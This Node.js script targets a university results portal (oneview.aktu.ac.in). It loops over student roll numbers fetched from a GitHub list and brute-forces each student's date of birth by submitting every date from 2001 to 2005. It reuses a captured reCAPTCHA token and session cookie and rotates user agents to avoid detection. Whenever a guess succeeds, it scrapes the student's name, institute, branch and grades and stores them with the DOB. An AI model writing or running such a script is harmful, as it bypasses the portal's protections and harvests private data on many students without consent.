const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');


// File path for storing all resolved data
const outputFilePath = path.join(__dirname, 'resolved_data.txt');

// Function to read existing data from file
function readExistingData() {
  try {
    const data = fs.readFileSync(outputFilePath, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    // If file doesn't exist or is empty, return an empty array
    return [];
  }
}

// Function to write resolved data to a single text file
function writeToFile(data) {
  const existingData = readExistingData();
  
  // Check if rollNo already exists in existingData
  const rollNoExists = Array.isArray(existingData) && existingData.some(entry => entry.rollNo === data.rollNo);
  
  if (!rollNoExists) {
    try {
      fs.writeFileSync(outputFilePath, JSON.stringify(data, null, 2) + '\n', { flag: 'a+' }); // 'a+' flag for appending
      console.log('Successfully appended data to resolved_data.txt');
    } catch (err) {
      console.error('Error writing data to file:', err);
    }
  } else {
    console.log(`Roll number ${data.rollNo} already exists in resolved_data.txt. Skipping duplicate entry.`);
  }
}

// Function to update DOB and SGPA data and append to the file
function updateStudentData(rollNo, dob, sgpa) {
  const data = {
    rollNo: rollNo,
    DOB: dob,
    SGPA: sgpa
  };

  writeToFile(data);
}



const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
];

function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}


async function solve(rollNo,day, month,year) {

  
let data = qs.stringify({
  '__EVENTTARGET': '',
  '__EVENTARGUMENT': '',
  '__VIEWSTATE': '/wEPDwULLTExMDg0MzM4NTIPZBYCAgMPZBYEAgMPZBYEAgkPDxYCHgdWaXNpYmxlaGRkAgsPDxYCHwBnZBYCAgEPDxYCHwBnZBYCAgMPDxYCHgdFbmFibGVkZ2RkAgkPZBYCAgEPZBYCZg9kFgICAQ88KwARAgEQFgAWABYADBQrAABkGAEFEmdyZFZpZXdDb25mbGljdGlvbg9nZI39oJgydt1DpqkTbfYVCIehpm4TLMtdl7PeRLzN+5Jy',
  '__VIEWSTATEGENERATOR': 'FF2D60E4',
  '__EVENTVALIDATION': '/wEdAAbVARScphHwmjwD865sI1EeWB/t8XsfPbhKtaDxBSD9Lx25Lt8Vu4DZSHACA6NZjXuO1N1XNFmfsMXJasjxX85jSqX/wPN6qcfKF0mMYn5Pzrqic3S0ZDjCzqE9M2ZhdeRT68jJfo8Qy8cvEUD7m7ars0BV+cLKRjL8DPXKB3128Q==',
  'txtRollNo': rollNo,
  'txtDOB': `${day}/${month}/${year}`,
  'g-recaptcha-response': '03AFcWeA7hLvGsRSdgaC9MhN5sTcRuglmMBo3820Fx9Ildn8mWsp_m8Zu2w10fPq_SGMHIspjtUUezrG_umJmVYxEh1RFyXL82VGzGFRAvFDFMRO_kYAc9flB14jOymAkINQ8uLFHlR6OVhjTzEzW47gp4J6QD8JIvUjqQMPi95GVAIMBIQWx9LfG2iBFYlSCH2Y7yVqI593Qb3jyZRPR85MeSRwUPTS5_rY0HWKdH7NeuW0SjtU-feTHF_xlNgfvcTode6F_jDzBAaDSck7P5lLYHS1wgobQmKHREOg_1E7qXYwMvWDNNA2p9px1GHEmvD25db7WyP2wIIIFPhFt4MrrKVoZuSxJkW8Cdj0jNDUDRK7-djCDFrMUYkpmiiheBt2jz7b5RBTe-H9MahQsokNd6vAyq_Oroba9SLEFvrE715778ZUUn9og9ldRS_14OrwUyFPQeLrgoAV2Gxs_vuINZIf86oIb-gxoUBBVultOyL2AGkJhiX5xER0Xd_U74YjoJKdkkVGvpH3RxFfU51BmItcB_K9iwKPbiKGlSk2sdsXTBM9taRhoLJ5JAG7QcmUrpF3H9mStT_fN9-VeL-BwGod8D9vkQwiLZXCLpNU8TGZ90bFQRoNaf_3rO7-42I-twbaZUonJDrxSoBqS6122y2-lESb-DciOFJUFsb9-73IqBUYbCzff33F67md_Gh66S_X4V0CERqIVGW-1u3BQ_tzM7WM8B8HOG-PS0eH1I4VpzDya1Aix2iwwYHsMohjErmw-SHulndvWn6JrSv2K4LYx2ydubX_ZY_pJy52vC0eoj7FSMdAyBBJ_PmVgWil3Ssdvl60UWgx3_LcKhJNWaMo28I2acdG6JXYkJEUGbTZA6LW-GhwGGVIgCXpZFlPecJ0OZBy2rjxhfUI6QEsXm1P6EkS_VIlkOHyumaMFy5s07chpCoFzIuXTAccEixxCeogw6KuiN_g_MuqVvpUHv3grrHLQu8_lOjIxrydsH7hCG4pEb9umVyOzy-R6ebjWtT6c2pN6rqP_zeaZ_iREWzZ_v5bt1LEFRD7_g9b91Rh9DQx2neRPeRv85ifWCSLtRl9ZF81enTK7kjrt8Y65fz7J7ciXREBavT8a7B49ApgcL-PshvYzZQIHu4uPW8fU-evOQy2cBFNdDe7476Vg3yfWF1i9u3xKSo-m5egu7vw1m6YA_ClvF1Onjgt5oa0BjzoKZpU1dVG6xPt_O5he99qDaQDeR7eKZ6unsXpl3J0R0G_QTQSIGv05dpj4c1P7WsNHvvRbt8LxbI8N3hpcHQktGoqh3hduYtIIBrXluPEVkGNZVU3j6m_MZ57b1nppYwqMhOeWEV4ltiw5idgpFeYdcCyYQJoCqzqPbwoI5bdXCUHkX4QsQS-tVle1xFQ_u2G4UWKI6d5uvAP2jtuBkcfxro04LHDaxby12sgivly_DKZRW4mAzfF5mCaqrp16_Pe6LoAImWwB60lBQjPEd2zckp0W5oyNPKCAOsrLEM6GpB41PO3NA6qMfeNqkPVy8V3PVpBMORZtYCfF8RF94DkBR59Za_-f38-dbf57aslP7IjKy-ycC8EyOH1tXEXUFZTE2ZRpuxRDoyfwN2mQUWfg6itNFi1mha1nU5ry_b4CkETmcIXQCPxW2kQ9Q-HppVlxaXSHWiu55jRt1M9Oa2oE5-fmlOnXcFxjEcEKuEVhPtZLqiPz7lsYPz5rVVkGYr6v4VuiPixWetQOaLYY7PG3pfga1JglOrUS9DVPji8Hvxvr1wJQryn5rDXEiQr4Zbj_327Ttzmly71ix7FZQ5y50kIgrAQyZ5EMrfjvQaJ5f1hTR7ohywVMxWkZHs24nF4bF2eN7',
  'btnSearch': 'खोजें',
  'hidForModel': '' 
});

let config = {
  method: 'post',
  
  maxBodyLength: Infinity,
  url: 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx',
  headers: { 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
    'Accept-Language': 'en-US,en;q=0.9', 
    'Cache-Control': 'max-age=0', 
    'Connection': 'keep-alive', 
    'Content-Type': 'application/x-www-form-urlencoded', 
    'Cookie': '_ga=GA1.3.1307891188.1718286218; ASP.NET_SessionId=pb45i2v2vxvaa1ykv1esb2an; _gid=GA1.3.1355207994.1719116977; _gat=1; _ga_P8H34B230T=GS1.3.1719116977.3.1.1719117085.0.0.0', 
    'Origin': 'https://oneview.aktu.ac.in', 
    'Referer': 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx', 
    'Sec-Fetch-Dest': 'document', 
    'Sec-Fetch-Mode': 'navigate', 
    'Sec-Fetch-Site': 'same-origin', 
    'Sec-Fetch-User': '?1', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': getRandomUserAgent(), 
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 
    'sec-ch-ua-mobile': '?1', 
    'sec-ch-ua-platform': '"Android"'
  },
  data : data
};
  try {
    const response = await axios.request(config);
    const parseData = parseHTML(JSON.stringify(response.data));
    return parseData;
  } catch (e) {
    return null;
  }

}

function cleanString(str) {
  return str.replace(/\\r|\\n/g, '').trim();
}


function parseHTML(htmlContent){
  const $ = cheerio.load(htmlContent);
  const rollNo = $('td:contains("RollNo")').next().next().text().trim() || 'N/A';
  const name = $('td:contains("Institute Code")').next().next().text().replace(/[0-9()]/g, '').trim().replace(/[\n\r\t]/g, '') || 'N/A';
  const branch = $('td:contains("Branch Code")').next().next().text().replace(/[0-9()]/g, '').trim() || 'N/A';
  const sgpa = $('td:contains("SGPA")').next().next().text().trim() || 'N/A';
  const fullName = $('td:contains("Name")').next().next().text().replace(/[0-9()]/g, '').trim().replace(/[\n\r\t]/g, '') || 'N/A';

  const names = fullName.split(/\s\s+/).map(name => name.trim()).filter(name => name);
  const firstName = names[9];
  let semesters = 'N/A';
  
  
  if(sgpa != 'N/A'){
    const sgpas = sgpa.match(/\d+\.\d+/g);
    semesters = sgpas.reduce((acc, sgpa, index) => {
      acc[`sem${index + 1}`] = parseFloat(sgpa);
      return acc;
    }, {});
  }

  

  if (rollNo == 'N/A' || name == 'N/A' || branch == 'N/A' || fullName == 'N/A' || !sgpa) {
    return null;
  }


  return {
    rollNo: cleanString(rollNo),
    instituteName: cleanString(name),
    branch: cleanString(branch),
    SGPA: semesters,
    fullName: cleanString(firstName)
  };

}

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));




async function main(rollNo) {
  // Define days in each month
  
  const daysInMonth = {
    1: 31,   // January
    2: 28,   // February (assuming non-leap year for simplicity)
    3: 31,   // March
    4: 30,   // April
    5: 31,   // May
    6: 30,   // June
    7: 31,   // July
    8: 31,   // August
    9: 30,   // September
    10: 31,  // October
    11: 30,  // November
    12: 31   // December
  };
  let solved = false;
  for (let year = 2005; year >= 2001; year--) {
    if (solved) {
      break;
    }
    for (let month = 1; month <= 12; month++) {
      if (solved) { // Exit if already solved 
        break;
      }
      const dataPromises = [];
      const maxDays = daysInMonth[month];
      console.log(`Trying for ${month}/${year}`);
      
      for (let day = 1; day <= maxDays; day++) {
        const dataPromise = solve(rollNo, day.toString(), month.toString(), year.toString())
          .then(data => {
            if (data) {
              console.log(`Resolved for ${day}/${month}/${year}:`, data);
              updateStudentData(rollNo, `${year}-${month}-${day}`, data.SGPA); // Update DOB and SGPA in MySQL
              solved = true;
            }
          })
          .catch(error => {
            console.error(`Error for ${day}/${month}/${year}:`, error);
          });

        dataPromises.push(dataPromise);
        await delay(150); // Add a delay to avoid overwhelming the server
      }

      // Wait for all promises in this month to resolve
      await Promise.all(dataPromises);
    }
  }
}




//fetch roll numbers from a json file from github link
async function fetchRollNumbers() {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/devxoshakya/miet-results/main/btech_db.json');
    const jsonData = response.data;

    // Assuming jsonData is an array of objects with 'rollNo' fields
    const rollNumbers = jsonData.map(item => item.rollNo);

    return rollNumbers;
  } catch (error) {
    console.error('Error fetching data from GitHub:', error);
    return []; // Return empty array on error
  }
}

console.log('Fetching roll numbers from GitHub...');
fetchRollNumbers().then(rollNumbers => {
  console.log('Fetched roll numbers:', rollNumbers);
  processRollNumbers(rollNumbers);
});


async function processRollNumbers(rollNos) {
  for (const rollNo of rollNos) {
    console.log(`Processing roll number: ${rollNo}`);
    await main(rollNo);
  }
}

// processRollNumbers(rollNo);